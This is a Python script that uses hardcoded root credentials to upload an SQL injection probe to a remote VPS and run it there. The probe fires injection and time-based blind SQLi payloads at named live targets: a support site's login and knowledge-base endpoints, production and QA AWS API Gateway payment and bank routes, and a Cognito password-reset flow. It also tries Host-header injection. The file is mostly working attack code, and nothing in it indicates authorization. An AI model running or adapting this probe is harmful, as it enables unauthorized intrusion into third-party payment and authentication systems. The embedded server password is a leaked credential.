"""SQLi probe on all Disperso input points."""
import paramiko, textwrap

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, re

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=15):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
        if "Content-Type" not in hdrs:
            hdrs["Content-Type"] = "application/json"
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

SQLI = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "admin'--",
    "1; SELECT 1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' WAITFOR DELAY '0:0:3'--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND SLEEP(3)--",
    "1'; SELECT pg_sleep(3)--",
    "') OR ('1'='1",
    "${7*7}",
    "{{7*7}}",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

BLIND_TIME = [
    ("mysql", "1' AND SLEEP(5)-- -"),
    ("mysql2", "1' OR SLEEP(5)-- -"),
    ("pg", "1'; SELECT pg_sleep(5)-- -"),
    ("pg2", "1' AND (SELECT pg_sleep(5))::text='1"),
    ("mssql", "1'; WAITFOR DELAY '0:0:5'-- -"),
    ("oracle", "1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x"),
    ("sqlite", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"),
]

# ======================================================
print("=" * 60)
print("1. SOPORTE LOGIN SQLi")
print("=" * 60)

baseline_s, baseline_b, _ = req("https://soporte.disperso.com/api/v1/auth/login",
    data={"email": "test@test.com", "password": "test123"})
baseline_len = len(baseline_b)
print(f"  Baseline: {baseline_s} ({baseline_len}b) {baseline_b[:100].decode(errors='replace')}")
time.sleep(2)

results = []
for i, payload in enumerate(SQLI[:15]):
    # SQLi in email
    s1, b1, h1 = req("https://soporte.disperso.com/api/v1/auth/login",
        data={"email": payload, "password": "test123"})
    
    # SQLi in password
    s2, b2, h2 = req("https://soporte.disperso.com/api/v1/auth/login",
        data={"email": "test@test.com", "password": payload})
    
    diff1 = "DIFF!" if len(b1) != baseline_len or s1 != baseline_s else ""
    diff2 = "DIFF!" if len(b2) != baseline_len or s2 != baseline_s else ""
    
    if diff1 or diff2 or s1 not in (401, 429) or s2 not in (401, 429):
        print(f"  {diff1}{diff2} [{i}] email: {s1}({len(b1)}b) pwd: {s2}({len(b2)}b) payload: {payload[:40]}")
        print(f"    email body: {b1[:150].decode(errors='replace')}")
        print(f"    pwd body: {b2[:150].decode(errors='replace')}")
    else:
        print(f"  [{i}] email:{s1}({len(b1)}b) pwd:{s2}({len(b2)}b) {payload[:30]}")
    
    results.append({"payload": payload, "email_s": s1, "email_len": len(b1), "pwd_s": s2, "pwd_len": len(b2)})
    time.sleep(1.5)  # avoid rate limit

# ======================================================
print("\n" + "=" * 60)
print("2. SOPORTE LOGIN TIME-BASED BLIND SQLi")
print("=" * 60)

for db, payload in BLIND_TIME:
    t0 = time.time()
    s, b, h = req("https://soporte.disperso.com/api/v1/auth/login",
        data={"email": payload, "password": "x"})
    elapsed = time.time() - t0
    tag = "!!! DELAY" if elapsed > 4 else ""
    print(f"  {tag} {db}: {s} ({len(b)}b) {elapsed:.1f}s {b[:80].decode(errors='replace')}")
    time.sleep(1.5)

# ======================================================
print("\n" + "=" * 60)
print("3. NOTIFICATION ENDPOINT SQLi (no auth)")
print("=" * 60)

GW = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod"

# Baseline
s0, b0, _ = req(f"{GW}/api/v1/notification", data={"test": "normal"}, method="POST")
print(f"  Baseline: {s0} ({len(b0)}b)")

for payload in SQLI[:10]:
    for field in ["message", "title", "email", "id", "userId"]:
        s, b, h = req(f"{GW}/api/v1/notification",
            data={field: payload}, method="POST")
        if s != 200 or len(b) != len(b0):
            print(f"  DIFF! {field}={payload[:25]}: {s} ({len(b)}b) {b[:100].decode(errors='replace')}")
    time.sleep(0.5)

# Time-based on notification
print("\n  --- Time-based ---")
for db, payload in BLIND_TIME[:4]:
    t0 = time.time()
    s, b, h = req(f"{GW}/api/v1/notification",
        data={"message": payload}, method="POST")
    elapsed = time.time() - t0
    tag = "!!! DELAY" if elapsed > 4 else ""
    print(f"  {tag} {db}: {s} ({len(b)}b) {elapsed:.1f}s")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("4. SOPORTE — OTHER ENDPOINTS SQLi")
print("=" * 60)

# Knowledge base / slug endpoints (might have DB queries)
for path in [
    "/api/v1/knowledge-base?search=",
    "/api/v1/knowledge-base?slug=",
    "/api/v1/knowledge-base?category=",
    "/api/v1/tickets?id=",
    "/api/v1/auth/forgot-password",
    "/api/v1/auth/reset-password",
]:
    if "?" in path:
        base, param = path.split("?", 1)
        key = param.split("=")[0]
        for payload in ["'", "' OR '1'='1'--", "1 AND 1=1", "1 AND 1=2"]:
            url = f"https://soporte.disperso.com{base}?{key}={urllib.request.quote(payload)}"
            s, b, h = req(url)
            tag = "!!!" if s == 200 else ""
            if s not in (401, 403, 404, 429):
                print(f"  {tag} GET {path}{payload[:20]}: {s} ({len(b)}b) {b[:100].decode(errors='replace')}")
            else:
                print(f"  GET {path}{payload[:20]}: {s} ({len(b)}b)")
            time.sleep(0.8)
    else:
        for payload in ["'", "test@test.com' AND '1'='1"]:
            body = {"email": payload}
            s, b, h = req(f"https://soporte.disperso.com{path}", data=body)
            tag = "!!!" if s == 200 else ""
            print(f"  {tag} POST {path}: {s} ({len(b)}b) {b[:100].decode(errors='replace')}")
            time.sleep(1)

# ======================================================
print("\n" + "=" * 60)
print("5. API GATEWAY — PARAMETER SQLi (prod + QA)")
print("=" * 60)

for base, env in [
    ("https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod", "PROD"),
    ("https://clxkb4ym40.execute-api.us-east-2.amazonaws.com/qa", "QA"),
]:
    for path in [
        "/api/v1/payment-order/internal-id/'",
        "/api/v1/payment-order/' OR '1'='1",
        "/api/v1/bank?q='",
        "/api/v1/bank/' OR '1'='1",
        "/api/v1/payment-order/internal-id/1' AND '1'='1",
    ]:
        s, b, h = req(f"{base}{path}")
        if s not in (403,):
            print(f"  {env} {path[:50]}: {s} ({len(b)}b) {b[:100].decode(errors='replace')}")
        time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("6. COGNITO SQLi (via username)")
print("=" * 60)

def cognito(target, body):
    data = json.dumps(body).encode()
    r = urllib.request.Request("https://cognito-idp.us-east-2.amazonaws.com/",
        data=data,
        headers={
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": f"AWSCognitoIdentityProviderService.{target}",
            "User-Agent": "Mozilla/5.0"
        })
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

QA_CLIENT = "cavifd298a9olegm3j0o1jnnp"

for payload in ["' OR '1'='1'--", "admin'--", "1; SELECT 1--"]:
    s, b = cognito("ForgotPassword", {"ClientId": QA_CLIENT, "Username": payload})
    msg = b[:200].decode(errors="replace")
    print(f"  ForgotPwd({payload[:20]}): {s} {msg[:100]}")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("7. SOPORTE — HEADER INJECTION / HOST HEADER SQLi")
print("=" * 60)

for host in ["soporte.disperso.com' OR '1'='1", "soporte.disperso.com%00.evil.com"]:
    try:
        s, b, h = req("https://soporte.disperso.com/api/v1/auth/login",
            data={"email": "t@t.com", "password": "t"},
            headers={"Host": host})
        print(f"  Host({host[:30]}): {s} ({len(b)}b)")
    except Exception as e:
        print(f"  Host({host[:30]}): ERROR {str(e)[:60]}")
    time.sleep(0.5)

print("\n" + "=" * 60)
print("SQLi PROBE DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/sqli_probe.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, running SQLi probe...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/sqli_probe.py 2>&1", timeout=300)
out = stdout.read().decode(errors="replace")
with open(r"c:\xampp\htdocs\pentagi\disperso_recon\sqli_results.txt", "w", encoding="utf-8", errors="replace") as f:
    f.write(out)
print(out)
ssh.close()
